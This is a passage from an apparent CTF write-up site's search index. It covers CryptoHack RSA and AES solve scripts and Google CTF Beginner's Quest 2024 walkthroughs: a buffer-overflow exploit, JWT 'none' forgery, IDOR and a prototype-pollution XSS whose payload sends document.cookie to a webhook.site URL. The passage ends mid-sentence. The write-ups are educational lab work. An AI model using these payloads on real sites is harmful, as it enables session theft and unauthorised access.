Inutilis","text":"<pre><code>from Crypto.Util.number import long_to_bytes\n\nwith open(\"output.txt\", \"r\") as f:\n    n = int(f.readline().split()[-1])\n    e = int(f.readline().split()[-1])  # e=3, small public exponent\n    c = int(f.readline().split()[-1])\n\n    # c = m^3 mod n\n    # since m^3 &lt; n, m = c^(1/3)\n\n    def int_cbrt(x):\n        lo, hi = 0, x\n        while lo &lt; hi:\n            mid = (lo + hi) // 2\n            if mid**3 &lt; x:\n                lo = mid + 1\n            else:\n                hi = mid\n        return lo\n\n    m = int_cbrt(c)\n    print(long_to_bytes(m))\n</code></pre>"},{"location":"Cryptohack/RSA/Public%20Exponent/#3-everything-is-big","title":"3. Everything is Big","text":"<pre><code>from Crypto.Util.number import long_to_bytes\nimport owiener\n\nwith open(\"output.txt\", \"r\") as f:\n    n = int(f.readline().split()[-1],16)\n    e = int(f.readline().split()[-1],16) \n    c = int(f.readline().split()[-1],16)\n\n    # Weiner's attack when d &lt; 1/3 * N^(1/4)\n    d = owiener.attack(e, n)\n    m = pow(c, d, n)\n    print(long_to_bytes(m))\n</code></pre>"},{"location":"Cryptohack/RSA/Public%20Exponent/#4-crossed-wires","title":"4. Crossed Wires","text":"<p>Algorithm</p> <pre><code>import random\nfrom Crypto.Util.number import GCD, inverse, long_to_bytes\n\nwith open(\"output.txt\", \"r\") as f:\n    N, d = f.readline().split(\": \")[1].strip().strip(\"()\").split(\", \")\n    my_key = (int(N), int(d))\n    # print(my_key)\n\n    friend_keys = []\n    l = f.readline().split(\": \")[1].strip().strip(\"[]\").split(\", \")\n    for i in range(0, len(l), 2):\n        friend_keys.append((int(l[i].strip(\"()\")), int(l[i + 1].strip(\"()\"))))\n    # print(friend_keys)\n\n    c = int(f.readline().split(\": \")[1].strip())\n    # print(c)\n\n    def find_pq(N, d, e):\n        k = d * e - 1\n        while True:\n            g = random.randint(2, N - 1)\n            t = k\n            while t % 2 == 0:\n                t //= 2\n                x = pow(g, t, N)\n                y = GCD(x - 1, N)\n                if 1 &lt; y &lt; N:\n                    p = y\n                    q = N // y\n                    return p, q\n\n    N, d = my_key\n    e = 0x10001\n    p, q = find_pq(N, d, e)\n    # print(p, q)\n    phi = (p - 1) * (q - 1)\n\n    for key in friend_keys[::-1]:\n        d = inverse(key[1], phi)\n        c = pow(c, d, key[0])\n\n    print(long_to_bytes(c))\n</code></pre>"},{"location":"Cryptohack/RSA/Public%20Exponent/#5-everything-is-still-big","title":"5. Everything is Still Big","text":"<p>Boneh-Durfee Attack</p>"},{"location":"Cryptohack/RSA/Public%20Exponent/#6-endless-emails","title":"6. Endless Emails","text":"<p>Hastad's Broadcast Attack</p> <pre><code>from Crypto.Util.number import long_to_bytes, inverse\nfrom math import prod\nfrom gmpy2 import iroot\nfrom itertools import combinations\n\nwith open(\"output.txt\", \"r\") as f:\n    n_list = []\n    c_list = []\n\n    for _ in range(7):\n        n = int(f.readline().split()[-1])\n        e = int(f.readline().split()[-1]) \n        c = int(f.readline().split()[-1])\n        n_list.append(n)\n        c_list.append(c)\n        f.readline()\n        f.readline()\n\ndef cbrt(x):\n    m, valid = iroot(x, 3)\n    if valid:\n        print(\"Cleartext:\", long_to_bytes(m))\n\ndef crt(C, N): # Chinese Remainder Theorem\n    total = 0\n    modulo = prod(N)\n\n    for n_i, c_i in zip(N, C):\n        p = modulo // n_i\n        total += c_i * inverse(p, n_i) * p\n    return total % modulo\n\n# Generate all possible combinations of at least 3 elements\nfor r in range(3, len(c_list) + 1):\n    for c_subset, n_subset in zip(combinations(c_list, r), combinations(n_list, r)):\n        result = crt(c_subset, n_subset)\n        cbrt(result)\n</code></pre>"},{"location":"Cryptohack/RSA/RSA%20Starter/","title":"Starter","text":""},{"location":"Cryptohack/RSA/RSA%20Starter/#1-modular-exponentiation","title":"1. Modular Exponentiation","text":"<pre><code>print(pow(12,65537,22663))\n</code></pre>"},{"location":"Cryptohack/RSA/RSA%20Starter/#2-public-keys","title":"2. Public Keys","text":"<pre><code>e=65537\np=17\nq=23\nN = p*q\n\ndef encrypt(m):\n    return pow(m, e, N)\n\nm=12\nprint(encrypt(m))\n</code></pre>"},{"location":"Cryptohack/RSA/RSA%20Starter/#3-eulers-totient","title":"3. Euler's Totient","text":"<pre><code>p = 857504083339712752489993810777\nq = 1029224947942998075080348647219\n\nprint((1-p)*(1-q))\n</code></pre>"},{"location":"Cryptohack/RSA/RSA%20Starter/#4-private-keys","title":"4. Private Keys","text":"<pre><code>p = 857504083339712752489993810777\nq = 1029224947942998075080348647219\ne = 65537\nphi = (p-1)*(q-1)\nprint(pow(e, -1, phi))\n</code></pre>"},{"location":"Cryptohack/RSA/RSA%20Starter/#5-rsa-decryption","title":"5. RSA Decryption","text":"<pre><code>p = 857504083339712752489993810777\nq = 1029224947942998075080348647219\ne = 65537\nphi = (p-1)*(q-1)\nd = pow(e, -1, phi)\n\nc = 77578995801157823671636298847186723593814843845525223303932\nm = pow(c, d, p*q)\nprint(m)\n</code></pre>"},{"location":"Cryptohack/RSA/RSA%20Starter/#6-rsa-signatures","title":"6. RSA Signatures","text":"<pre><code>import hashlib\nfrom Crypto.Util.number import *\n\nflag = \"crypto{Immut4ble_m3ssag1ng}\"\n\nwith open(\"private.key\", \"r\") as f:\n    N = int(f.readline().split()[-1])\n    d = int(f.readline().split()[-1])\n\n    hash = hashlib.sha256(flag.encode()).digest()\n    print(pow(bytes_to_long(hash), d, N))\n</code></pre>"},{"location":"Cryptohack/RSA/Signatures%20Part%201/","title":"Signatures Part 1","text":""},{"location":"Cryptohack/RSA/Signatures%20Part%201/#1-signing-server","title":"1. Signing Server","text":"<pre><code>from pwn import *\nimport json\n\nconn = remote(\"socket.cryptohack.org\", 13374)\nconn.recvline()\n\nconn.sendline(json.dumps({\"option\": \"get_secret\"}).encode())\nc = json.loads(conn.recvline().decode())[\"secret\"]\nconn.sendline(json.dumps({\"option\": \"sign\", \"msg\": str(c)}).encode())\n\nsignature = json.loads(conn.recvline().decode())[\"signature\"][2:]\nm = bytes.fromhex(signature)\nprint(m)\n</code></pre>"},{"location":"Cryptohack/Symmetric%20Ciphers/Block%20Ciphers%201/","title":"Block Ciphers 1","text":""},{"location":"Cryptohack/Symmetric%20Ciphers/Block%20Ciphers%201/#1-ecb-cbc-wtf","title":"1. ECB CBC WTF","text":"<pre><code>import requests\n\nciphertext = requests.get('https://aes.cryptohack.org/ecbcbcwtf/encrypt_flag').json()['ciphertext']\niv_hex = ciphertext[:32]\nciphertext = ciphertext[32:]\nplaintext = requests.get('https://aes.cryptohack.org/ecbcbcwtf/decrypt/' + ciphertext).json()['plaintext']\n\nfor i in range(0, len(plaintext), 32):\n    iv = ''\n    if i == 0:\n        iv = iv_hex\n    else:\n        iv = ciphertext[i-32:i]\n\n    print(bytes([a ^ b for a, b in zip(bytes.fromhex(iv), bytes.fromhex(plaintext[i:i+32]))]).decode(), end='')\n</code></pre>"},{"location":"Cryptohack/Symmetric%20Ciphers/Block%20Ciphers%201/#3-flipping-cookie","title":"3. Flipping Cookie","text":"<pre><code>import requests\n\nurl = 'https://aes.cryptohack.org/flipping_cookie/'\n\ncookie = requests.get(url+'get_cookie/').json()['cookie']\niv_bytes = list(bytes.fromhex(cookie[:32]))\nreal = 'admin=False'\nfake = ';admin=True'\n\nfor i in range(len(real)):\n    iv_bytes[i] ^= ord(real[i]) ^ ord(fake[i])\n\niv_hex = ''.join([hex(b)[2:].zfill(2) for b in iv_bytes])\nprint(requests.get(url+'check_admin/'+iv_hex+cookie[32:]+'/'+iv_hex+'/').json())\n</code></pre>"},{"location":"Cryptohack/Symmetric%20Ciphers/Block%20Ciphers%201/#4-lazy-cbc","title":"4. Lazy CBC","text":"<pre><code>import requests\n\nurl = 'https://aes.cryptohack.org/lazy_cbc/'\n\n\"\"\"\nd(ct0) = iv ^ pt0\nd(ct1) = ct0 ^ pt1\n\nif ct0 = ct1, then iv = pt0 ^ pt1 ^ ct0\n\"\"\"\n\nres = requests.get(url + 'receive/' + '0'*64).json()\npt = res['error'].split(':')[1].strip()\n# print(pt)\npt0 = bytes.fromhex(pt[:32])\npt1 = bytes.fromhex(pt[32:64])\n\niv = bytes([pt0[i]^pt1[i] for i in range(16)]).hex()\n# print(iv)\n\nflag = requests.get(url+'get_flag/' + iv).json()['plaintext']\nprint(bytes.fromhex(flag))\n</code></pre>"},{"location":"Cryptohack/Symmetric%20Ciphers/How%20AES%20Works/","title":"How AES Works","text":""},{"location":"Cryptohack/Symmetric%20Ciphers/How%20AES%20Works/#3-structure-of-aes","title":"3. Structure of AES","text":"<pre><code>def matrix2bytes(matrix):\n    \"\"\" Converts a 4x4 matrix into a 16-byte array.  \"\"\"\n    return bytes([matrix[i][j] for i in range(4) for j in range(4)])\n</code></pre>"},{"location":"Cryptohack/Symmetric%20Ciphers/How%20AES%20Works/#4-round-keys","title":"4. Round Keys","text":"<pre><code>def add_round_key(s, k):\n    return [[s[i][j] ^ k[i][j] for j in range(4)] for i in range(4)]\n</code></pre>"},{"location":"Cryptohack/Symmetric%20Ciphers/How%20AES%20Works/#5-confusion-through-substitution","title":"5. Confusion through Substitution","text":"<pre><code>def sub_bytes(s, sbox=s_box):\n    return [[sbox[b] for b in x] for x in s]\n</code></pre>"},{"location":"Cryptohack/Symmetric%20Ciphers/How%20AES%20Works/#6-diffusion-through-permutation","title":"6. Diffusion through Permutation","text":"<pre><code>def inv_shift_rows(s):\n    s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]\n    s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]\n    s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]\n</code></pre>"},{"location":"Cryptohack/Symmetric%20Ciphers/How%20AES%20Works/#7-bringing-it-all-together","title":"7. Bringing it all Together","text":"<pre><code>def decrypt(key, ciphertext):\n    round_keys = expand_key(key) # Remember to start from the last round key and work backwards through them when decrypting\n\n    # Convert ciphertext to state matrix\n    state = bytes2matrix(ciphertext)\n\n    # Initial add round key step\n    state = add_round_key(state, round_keys[-1])\n\n    for i in range(N_ROUNDS - 1, 0, -1):\n        # Do round\n        inv_shift_rows(state)\n        state = sub_bytes(state, inv_s_box)\n        state = add_round_key(state, round_keys[i])\n        inv_mix_columns(state)\n\n    # Run final round (skips the InvMixColumns step)\n    inv_shift_rows(state)\n    state = sub_bytes(state, inv_s_box)\n    state = add_round_key(state, round_keys[0])\n\n    # Convert state matrix to plaintext\n    plaintext = matrix2bytes(state)\n    return plaintext\n</code></pre>"},{"location":"Cryptohack/Symmetric%20Ciphers/Symmetric%20Starter/","title":"Symmetric Starter","text":""},{"location":"Cryptohack/Symmetric%20Ciphers/Symmetric%20Starter/#2-password-as-keys","title":"2. Password as Keys","text":"<pre><code>import hashlib\nimport requests\nfrom Crypto.Cipher import AES\n\nciphertext = requests.get('https://aes.cryptohack.org/passwords_as_keys/encrypt_flag').json()['ciphertext']\n\nwith open(\"words\") as f:\n    words = [w.strip() for w in f.readlines()]\n\nfor word in words:\n    word_hash = hashlib.md5(word.encode()).digest()\n\n    # result = requests.get('https://aes.cryptohack.org/passwords_as_keys/decrypt/' + ciphertext + '/' + word_hash.hex()).json()\n    # plaintext = bytes.fromhex(result['plaintext'])\n\n    cipher = AES.new(bytes.fromhex(word_hash.hex()), AES.MODE_ECB)\n    decrypted = cipher.decrypt(bytes.fromhex(ciphertext)).hex()\n    plaintext = bytes.fromhex(decrypted)\n\n    if b'crypto' in plaintext:\n        print(\"key is\",word,\"flag:\",plaintext)\n        break\n    else:\n        print(\"key is not\", word)\n</code></pre>"},{"location":"EnigmaXplore%203.0/Programming/Guess%20the%20Number%20Arisu%21%21/","title":"Guess the Number Arisu!!","text":""},{"location":"EnigmaXplore%203.0/Programming/Guess%20the%20Number%20Arisu%21%21/#description","title":"Description","text":"<pre><code>In the endless dark between stars, a celestial knight named Barrister Selmy guards a secret code, a number hidden somewhere between 0 and\n65535, buried deep within the fabric of a black hole. Arisu, an explorer adrift in the void, must uncover it while conserving her dwindling\nenergy coins. She can send up to 200 quantum probes, each tuned to emit either an AND or OR signal, encoded with unique frequency numbers.\nEvery probe costs a single coin. Yet the emptiness is cruel, if she sends fewer than 200 signals, the void consumes the rest, draining her\ncoins equal to what remains unused. Each time, the black hole stirs, and Lord Selmy, or perhaps the worm within echoes back the result of the\noperation between the secret code and one of Arisu\u2019s frequencies, chosen at random. With every whisper, she inches closer to decoding the truth\nof the number, balancing precision and loss in the abyss of deep space.\n</code></pre>"},{"location":"EnigmaXplore%203.0/Programming/Guess%20the%20Number%20Arisu%21%21/#approach","title":"Approach","text":"<p>First thought: try OR operation with 200 0's. But this showed an error saying all input integers must be different.</p> <p>From the description, we know that the hidden number is between 0 and 65535, which means the number doesn't have more than 16 bits.</p> <p>Our input is integers, which can certainly be more than 16 bits.</p> <p>Idea: Input 200 such numbers whose lowest 16 bits are unset. Taking OR with any of these numbers and then extracting just the 16 bits will give the hidden number.</p>"},{"location":"EnigmaXplore%203.0/Programming/Guess%20the%20Number%20Arisu%21%21/#solve-script","title":"Solve Script","text":"<pre><code>from pwn import *\n\nnums = set()\nwhile len(nums) &lt; 200:\n    # Random 30-bit integer, zero out lower 16 bits\n    n = (random.randint(0, (1 &lt;&lt; 30) - 1) &gt;&gt; 16) &lt;&lt; 16\n    nums.add(n)\n\nr = remote(\"0.cloud.chals.io\", 15985)\nr.recvuntil(b\"Enter your choice: \")\nr.sendline(b\"0\")\nr.recvuntil(b\"Enter your choice: \")\nr.sendline(b\"1\")\nr.recvuntil(b\"Enter operation type (1 for AND, 2 for OR): \")\nr.sendline(b\"2\")\nr.recvuntil(b\"Enter up to 200 unique numbers (end with -1):\\n\")\n\npayload = b\"\"\nfor i in nums:\n    payload += str(i).encode() + b\" \"\npayload += b\"-1\"\n\nr.sendline(payload)\ns = r.recvline()\n# print(s)\nnum = int(s.decode().strip().split()[-1])\nnum &amp;= 0xFFFF # extract 16 lower bits\nprint(num)\nr.recvuntil(b\"Enter your choice: \")\nr.sendline(b\"3\")\ns = r.recvline()\nprint(s)\nr.recvuntil(b\"Enter your choice: \")\nr.sendline(b\"2\")\nr.recvuntil(b\"Enter your guess: \")\nr.sendline(str(num).encode())\ns = r.recvline()\nprint(s)\n</code></pre>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/DialUp/","title":"DialUp","text":"<p>It's a familiar sound to anyone who's ever dialed a phone. What's this caller trying to say?</p> <ul> <li>We are given a wav file, which sounds like dialing a phone</li> <li>Use a DTMF Decoder to get the number being dialled</li> <li>Convert the decimal to hex</li> <li>Convert the hex to text, and we get the flag</li> </ul>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Doors%20Everywhere/","title":"Doors Everywhere","text":"<p>https://secuweb-web.2024-bq.ctfcompetition.com/</p> <p></p> <p>https://secuweb-web.2024-bq.ctfcompetition.com/login</p> <p></p> <p>https://secuweb-web.2024-bq.ctfcompetition.com/home</p> <p></p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Doors%20Everywhere/#part-1","title":"Part 1","text":"<p>A security update about profiles? There's no way there could be a flag there. Unless?</p> <p>Clicking on \"Profile\" button redirects to https://secuweb-web.2024-bq.ctfcompetition.com/profile/guest \\ Changing the URL to https://secuweb-web.2024-bq.ctfcompetition.com/profile/admin gives the Flag</p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Doors%20Everywhere/#part-2","title":"Part 2","text":"<p>There are a few news articles there, but there's something odd about their URLs...</p> <p>Clicking on News articles redirect to https://secuweb-web.2024-bq.ctfcompetition.com/news/num where num=1,2,3,4,5,7 \\ num=6 gives the flag</p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Doors%20Everywhere/#part-3","title":"Part 3","text":"<p>Secret messages! Probably the most secure part of this website. There's no way to guess those URLs. ...Unless?</p> <p>Clicking on \"Send Secret Message\" button redirects to https://secuweb-web.2024-bq.ctfcompetition.com/send</p> <p></p> <p>Upon inspecting HTML:</p> <pre><code>&lt;label&gt;Secret ID:\n&lt;!--\n    FIXME: Hack to show people what the secret ID will be after they send their message. It _usually_\n        works, but sometimes it doesn't, if someone takes too long to write their message.\n        The real way to fix this is to better explain that they need to actually finish writing\n        their message before they can get the link.\n        If they really need the link inside the message, for some reason, we should just add\n        the ability to edit a message after saving it.\n--&gt;\n    &lt;input id=\"secretIdField\" type=\"text\" value=\"Click to display\" readonly=\"\" onclick=\"generateHash('1293')\"&gt;\n&lt;/label&gt;\n</code></pre> <p>And the number inside generateHash gets incremented at every reload</p> <p>The news article \"2024-06-30 - Secret Messages are Live\" redirects to article 7, which contains a link to a secret message: https://secuweb-web.2024-bq.ctfcompetition.com/message/67b176705b46206614219f47a05aee7ae6a3edbe850bbbe214c536b989aea4d2</p> <p>It can be confirmed that the hash in the URL is SHA3-256 hash of '1'</p> <p>So we need to find the number whose message contains the flag. Good old brute force:</p> <pre><code>from Crypto.Hash import SHA3_256\nimport requests\n\ni = 1\nwhile True:\n    h_obj = SHA3_256.new()\n    num = f'{i}'.encode()\n    h_obj.update(num)\n    digest = h_obj.hexdigest()\n\n    url = f'https://secuweb-web.2024-bq.ctfcompetition.com/message/{digest}'\n    response = requests.get(url)\n\n    if response.status_code == 200:\n        print(f\"[+] Found at {url}\")\n        print(response.text)\n        if \"CTF{\" in response.text:\n            break\n    else:\n        print(f\"[-] {url} returned status {response.status_code}\")\n\n    i = i+1\n</code></pre>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/GoLogicFlaw/","title":"GoLogicFlaw","text":"<p>Even though this program is written in Go and, hence, memory safe.. you can still write bugs. Can you find it?</p> <p>Given file:</p> <pre><code>package main\n\nimport (\n  \"bufio\"\n  \"fmt\"\n  \"math/rand\"\n  \"os\"\n  \"strconv\"\n  \"strings\"\n  \"time\"\n)\n\nfunc generateRandomNumber() int {\n  rand.Seed(time.Now().UTC().Unix())\n  return rand.Intn(1000000000)\n}\n\nfunc log(s string) {\n  fmt.Println(fmt.Sprintf(\"[%d] %s\", time.Now().UTC().Unix(), s))\n}\n\nfunc guessANumber(count int) bool {\n  randNumber := generateRandomNumber()\n\n  log(fmt.Sprintf(\"number %d: \", count))\n  reader := bufio.NewReader(os.Stdin)\n  line, err := reader.ReadString('\\n')\n  if err != nil {\n    fmt.Println(err)\n    os.Exit(1)\n  }\n  number, err := strconv.Atoi(strings.TrimSpace(line))\n  if err != nil {\n    fmt.Println(err)\n    os.Exit(1)\n  }\n\n  if number == randNumber {\n    return true\n  }\n\n  log(fmt.Sprintf(\"Guess failed: %d != %d\", number, randNumber))\n  return false\n}\n\nfunc win() {\n  content, err := os.ReadFile(\"/flag\")\n  if err != nil {\n    log(\"Unable to read the flag.\")\n    return\n  }\n  log(fmt.Sprintf(\"Here is your flag: %s\", string(content)))\n}\n\nfunc main() {\n  log(\"Guess three random numbers and win the flag!\")\n  for i := 1; i &lt;= 3; i++ {\n    success := guessANumber(i)\n    if !success {\n      log(\"No flag for you. bye bye ..\")\n      return\n    }\n  }\n  win()\n}\n</code></pre> <p>The core bug is reseeding the random number generator every time with time.Now().Unix(), which has only 1-second resolution and is also logged. \\ Here is a go script to get the random number from a given timestamp:</p> <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"math/rand\"\n)\n\nfunc main() {\n    var timestamp int64\n    fmt.Scan(&amp;timestamp)\n\n    r := rand.New(rand.NewSource(timestamp))\n    fmt.Println(r.Intn(1000000000))\n}\n</code></pre> <p>Connecto to server, pass the timestamp printed to the above script and input the generated number. Do this 3 times.</p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Infiltrate/","title":"Infiltrate","text":"<p>We are a security organization and our agents are given unique usernames that are impossible to guess. We have recently built a very secure inventory. If you are one of our agents, we have a package ready for you!</p> <p>Using GDB, take a look at <code>main()</code> function. It sets rbp-0x4 = 0xbaadc0de, and then compares it to 0xdefec8ed. The input starts from rbp-0x30. Clearly a buffer overflow vulnerability</p> <pre><code>from pwn import *\n\np = remote('infiltrate.2024-bq.ctfcompetition.com',1337)\np.recvuntil(b'Username please: ')\n\noffset = 0x30-4\npayload = b'a'*offset + p32(0xdefec8ed)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Jotes/","title":"Jotes","text":"<p>Welcome to our note taking app, I hope you can't see what we're writing</p> <p></p> <p></p> <p>\"NEWS: We've added new algorithms to JWT verification\" hmm..interesting. Reminds of the \"none\" algorithm attack in JWTs</p> <p>After registering and then logging in:</p> <p></p> <p>Decoding the JWT shown on screen (it is saved as \"auth_token\" Cookie), we get:</p> <ol> <li> <p>Header:</p> <p><code>json {     \"alg\": \"HS256\",     \"typ\": \"JWT\" }</code></p> </li> <li> <p>Payload:</p> <p><code>json {     \"user_id\": 43,     \"role\": \"user\",     \"username\": \"randomuser\" }</code></p> </li> </ol> <p>Change alg to \"none\" and role to \"admin\", encode to create a JWT. Edit the cookie and reload.</p> <p>We get Error: It says you are an admin. But your id can't be an admin?</p> <p>Yep, we're close!</p> <p>Create another JWT with user_id as 1</p> <p></p> <p>We're in! Read the note titled \"Flag\"</p> <p>JWT decoding and encoding at: https://jwt.io/</p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/No%20refund/","title":"No refund","text":"<p>You had a train service cancelled and you are entitled to a full refund. However the train companies website is not allowing you to. Can you still get it?</p> <p></p> <p>Submitting refund for the two allowed tickets makes a POST request:</p> <pre><code>curl 'https://no-refund-web.2024-bq.ctfcompetition.com/refund' \\\n  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \\\n  -H 'accept-language: en-US,en;q=0.9,hi;q=0.8' \\\n  -H 'cache-control: max-age=0' \\\n  -H 'content-type: application/x-www-form-urlencoded' \\\n  -H 'origin: https://no-refund-web.2024-bq.ctfcompetition.com' \\\n  -H 'priority: u=0, i' \\\n  -H 'referer: https://no-refund-web.2024-bq.ctfcompetition.com/' \\\n  -H 'sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"' \\\n  -H 'sec-ch-ua-mobile: ?0' \\\n  -H 'sec-ch-ua-platform: \"Linux\"' \\\n  -H 'sec-fetch-dest: document' \\\n  -H 'sec-fetch-mode: navigate' \\\n  -H 'sec-fetch-site: same-origin' \\\n  -H 'sec-fetch-user: ?1' \\\n  -H 'upgrade-insecure-requests: 1' \\\n  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36' \\\n  --data-raw 'reason=delay&amp;ticket_id=2355e4cf000965ac1fe9f0bc2624203e'\n</code></pre> <p>Both of them result in:</p> <pre><code>Our records show that the selected train service did not have any significant delay and was not canceled.\nIf you think this is incorrect please reach out to our customer service team.\n</code></pre> <p>Inspecting the <code>index.html</code>, we get the ticket_id of the disallowed refund:</p> <pre><code>&lt;div class=\"ticket-container\"&gt;\n    &lt;div class=\"ticket\" id=\"85cc3c46f7657a8a962d3b2b299d9be8\"&gt;\n      &lt;p&gt;&lt;strong&gt;From:&lt;/strong&gt; Flag City&lt;/p&gt;\n      &lt;p&gt;&lt;strong&gt;To:&lt;/strong&gt; Sunshine City&lt;/p&gt;\n      &lt;p&gt;&lt;strong&gt;Date:&lt;/strong&gt; 2025-08-28&lt;/p&gt;\n      &lt;p&gt;&lt;strong&gt;Time:&lt;/strong&gt; 10:30 AM&lt;/p&gt;\n    &lt;/div&gt;\n\n    &lt;div class=\"norefund\"&gt;\n      &lt;h4&gt;Not eligable for refund.&lt;/h4&gt;\n    &lt;/div&gt;\n\n&lt;/div&gt;\n</code></pre> <p>Making the above POST request with this ticket_id gives us the flag:</p> <pre><code>Your ticket will be refundend within 3-5 business days, confirmation code: CTF{xxxxx}\n</code></pre>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/OldMeetsNew/","title":"OldMeetsNew","text":"<p>Does it kind of defeat the purpose of me learning Morse code if I have to send it as a WAV anyway? Especially when the file won't even load properly!</p> <ul> <li>We are given a wav file, which doesn't open due to format error</li> <li>Looking at the header of the file, we notice WIFF at the start. For a wav file, it should be RIFF. Updating it fixes the format error, and we can listen to the morse code audio</li> <li>Use Morse Code Decoder to get the text, which looks base32/64-encoded</li> <li>Decoding (base32) gives the flag</li> </ul>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/PhantomSounds/","title":"PhantomSounds","text":"<p>It's a catchy song... but is there more than meets the eye?</p> <ul> <li>We are given an audio file: <code>spectrogram_challenge.wav</code></li> <li>Using Audacity or Academo, we can look at the spectrogram of the audio</li> <li>The flag is clearly visible in the spectogram</li> </ul>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Prototype%27s%20Fall/","title":"Prototype's Fall","text":"<p>The system's defenses are built on flawed foundations. Their inheritance isn't as robust as they believe. To exploit their weakness, don't just corrupt the blueprint; manipulate the very essence of their creation \u2013 the constructor itself. Twist its purpose, and watch their reality crumble.</p> <p></p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Prototype%27s%20Fall/#observations","title":"Observations","text":"<p>Inspecting the source code and outgoing requests</p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Prototype%27s%20Fall/#cycle-light-sequence","title":"Cycle Light Sequence","text":"<p>The button makes a GET request with query param <code>config: {\"darkMode\": true}</code>.</p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Prototype%27s%20Fall/#bot","title":"Bot","text":"<p>A bot visits the URL we provide in the text box.</p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Prototype%27s%20Fall/#getenv","title":"getEnv()","text":"<pre><code>// Returns the current env setup. Totally hardcoded because who has time for flexibility? No params, just deal with it.\nfunction getEnv() {\n    return {\n        // devMode: true, // Keeping devMode commented out for production sanity.\n        log: false, // Access logs... too boring for us.\n    }\n}\n\n// Merges two objects deeply. Because shallow merges are for the well-rested.\nfunction deepMerge(dest, src) {\n    for (let key in src) {\n        if (!src.hasOwnProperty(key)) {\n            continue\n        }\n        if (typeof src[key] !== 'object') {\n            dest[key] = src[key];\n            continue\n        } else if (key === '__proto__') { // This input sanitization? Prototype pollution doesn't stand a chance.\n            continue;\n        }\n\n        if (!dest[key]) {\n            if (Array.isArray(src[key])) {\n                dest[key] = []\n            } else {\n                dest[key] = {};\n            }\n        }\n        deepMerge(dest[key], src[key]);\n    }\n}\n\n// Gets the config. Defaults, env vars, all that jazz.\nfunction getConfig() {\n    config = {\n        darkMode: true,\n        username: \"Anonymous\",\n    }\n    const url = new URL(window.location.href);\n    const params = new URLSearchParams(url.search);\n    userConfig = JSON.parse(params.get(\"config\"))\n    deepMerge(config, userConfig);\n    return config\n} \n</code></pre>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Prototype%27s%20Fall/#devmode-safehtml","title":"devMode, safeHTML","text":"<pre><code>config = getConfig()\nif (getEnv().log) console.log(`Config: darkMode:${config.darkMode} username:${config.username}`)\n\nbody = document.getElementById(\"body\");\nif (config.darkMode) {\n    body.classList.add('dark-mode')\n} else {\n    body.classList.add('light-mode')\n}\n\ndocument.getElementById(\"toggle-dark-mode\").addEventListener('click', function () {\n    if (!userConfig) {\n        userConfig = {}\n    }\n    userConfig.darkMode = !config.darkMode\n    console.log(\"user config:\", userConfig)\n\n    const currentUrl = new URL(window.location.href)\n    currentUrl.searchParams.set(\"config\", JSON.stringify(userConfig))\n    window.location.href = currentUrl.toString()\n});\n\n// NEXT: Add a child in a safe way. For now, only do this in dev mode.\nif (getEnv().devMode) {\n    console.log(\"append child\")\n    child = document.createElement('div');\n    child.innerHTML = getEnv().safeHTML;\n    document.body.appendChild(child)\n}\n</code></pre>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Prototype%27s%20Fall/#approach","title":"Approach","text":""},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Prototype%27s%20Fall/#prototype-pollution","title":"Prototype Pollution","text":"<p>The <code>config</code> param can be used to pollute the prototype, thanks to the <code>deepMerge()</code> function</p> <p>The key \"__proto__\" is blacklisted, so found another way:</p> <pre><code>/?config={\"constructor\":{\"prototype\":{\"devMode\":true}}}\n</code></pre> <p></p> <p>The presence of \"undefined\" indicates that the attack was successful; <code>devMode</code> is set to true and <code>safeHTML</code> (which is undefined) is added to the html of the page</p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Prototype%27s%20Fall/#xss","title":"XSS","text":"<p>The bot may have the flag as a cookie (this is a classic setup in CTFs)</p> <p>We know there is <code>safeHTML</code> being added to the html of the page, which can be used to perform XSS to make the bot leak the cookie</p> <p>Trying it out in browser:</p> <pre><code>/?config={\"constructor\":{\"prototype\":{\"devMode\":true,\"safeHTML\":\"&lt;img src=x onerror='alert(\\\"flag\\\")'&gt;\"}}}\n</code></pre> <p></p> <p>Worked!</p> <p>Time for the final blow! Enter the payload (URL-encode it just to be safe) in the text box and send the bot:</p> <pre><code>/?config={\"constructor\":{\"prototype\":{\"devMode\":true,\"safeHTML\":\"&lt;img src=x onerror='fetch(\\\"https://webhook.site/7e300cd1-041a-447c-8c7a-1fce27998e04/?cookie=\\\"+document.cookie)'&gt;\"}}}\n</code></pre> <p></p> <p>Got the flag!</p>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Redacted%20RSA%201/","title":"Redacted RSA 1","text":"<p>I have a RSA private key, but it is partially redacted. Can you recover that? Run <code>openssl pkeyutl -decrypt -inkey key-recovered.pem -in encrypted.txt -out 